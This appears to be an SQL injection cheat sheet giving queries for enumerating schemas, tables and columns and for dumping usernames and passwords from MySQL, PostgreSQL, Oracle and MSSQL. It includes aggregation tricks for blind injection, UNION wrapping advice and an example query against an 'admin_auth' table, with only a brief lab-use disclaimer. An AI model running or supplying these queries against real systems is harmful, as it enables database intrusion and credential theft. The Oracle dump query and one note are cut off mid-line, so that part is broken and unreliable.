### SQL Commands for Data Exfiltration Across 4 DBMS

Below, I provide SQL queries for each step of data exfiltration: listing databases (schemas), tables, columns, and entries (data dumping). These are tailored for MySQL, PostgreSQL, Oracle, and MSSQL, based on standard methods from documentation and tutorials. Queries are designed to be run in a vulnerable context (e.g., via SQL injection or direct access). Note: 
- Limit results with LIMIT/OFFSET (MySQL/PostgreSQL/MSSQL) or ROWNUM/FETCH (Oracle) for pagination.
- Replace placeholders like `{database_name}` or `{table_name}` as needed.
- For security, these are for educational/lab use only—exfiltration in real systems is illegal without permission.

Use tables for clarity, with one per step.

#### 1. Listing Databases (Schemas)
| DBMS       | Query Example                                                                                                                   | Notes                                                                                                                           |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| MySQL      | `SELECT SCHEMA_NAME FROM information_schema.schemata LIMIT 1 OFFSET 0;`                                                         | Lists all databases; exclude system ones with `WHERE SCHEMA_NAME NOT IN ('information_schema', 'mysql', 'performance_schema')`. |
| PostgreSQL | `SELECT datname FROM pg_database WHERE datistemplate = false LIMIT 1 OFFSET 0;`                                                 | Lists non-template databases.                                                                                                   |
| Oracle     | `SELECT name FROM v$database;` or `SELECT DISTINCT OWNER FROM all_tables WHERE OWNER NOT IN ('SYS', 'SYSTEM') AND ROWNUM <= 1;` | v$database for current; all_tables owners for schemas (users).                                                                  |
| MSSQL      | `SELECT name FROM sys.databases WHERE database_id > 4 ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;`                      | Excludes system DBs (id <=4); use OFFSET/FETCH for pagination.                                                                  |

#### 2. Listing Tables in a Database
| DBMS       | Query Example                                                                                                                  | Notes                                                      |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------- |
| MySQL      | `SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = '{database_name}' LIMIT 1 OFFSET 0;`                    | Filter by schema.                                          |
| PostgreSQL | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 0;`                             | 'public' is default schema; adjust as needed.              |
| Oracle     | `SELECT TABLE_NAME FROM all_tables WHERE OWNER = '{schema_name}' AND ROWNUM <= 1;`                                             | all_tables for accessible; user_tables for current schema. |
| MSSQL      | `SELECT name FROM sys.tables WHERE schema_id = SCHEMA_ID('{schema_name}') ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;` | sys.tables for current DB; use sys.schemas for schema ID.  |

#### 3. Listing Columns in a Table
| DBMS       | Query Example                                                                                                                                 | Notes                           |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------- |
| MySQL      | `SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA = '{database_name}' AND TABLE_NAME = '{table_name}' LIMIT 1 OFFSET 0;` | Full column details.            |
| PostgreSQL | `SELECT column_name FROM information_schema.columns WHERE table_schema = 'public' AND table_name = '{table_name}' LIMIT 1 OFFSET 0;`          | Adjust schema.                  |
| Oracle     | `SELECT COLUMN_NAME FROM all_tab_columns WHERE OWNER = '{schema_name}' AND TABLE_NAME = '{table_name}' AND ROWNUM <= 1;`                      | all_tab_columns for accessible. |
| MSSQL      | `SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('{schema_name}.{table_name}') ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;`  | sys.columns for table columns.  |
|            |                                                                                                                                               |                                 |

#### 4. Dumping Entries (Data) from a Table
| DBMS       | Query Example                                                                                                                                       | Notes                                                                |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- |
| MySQL      | `SELECT CONCAT_WS(',', id, username, password) FROM {table_name} LIMIT 1 OFFSET 0;`                                                                 | CONCAT_WS to combine rows into one string for exfil; adjust columns. |
| PostgreSQL | `SELECT STRING_AGG(CONCAT(id, ':', username, ':', password), ';') FROM {table_name} LIMIT 1 OFFSET 0;`                                              | STRING_AGG for aggregation; use                                      |
| Oracle     | `SELECT LISTAGG(id                                                                                                                                  |                                                                      |
| MSSQL      | `SELECT STRING_AGG(CAST(id AS VARCHAR) + ':' + username + ':' + password, ';') FROM {table_name} ORDER BY id OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;` | STRING_AGG (SQL 2017+); CAST for types.                              |

These queries are exfiltration-friendly (e.g., aggregating to single strings for blind SQLi). For injection, wrap in subqueries (e.g., UNION SELECT ...). If limited, use bit-by-bit (e.g., SUBSTRING) for chars.

```sql
SELECT null,null,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'admin_auth' LIMIT 1 OFFSET 0;
```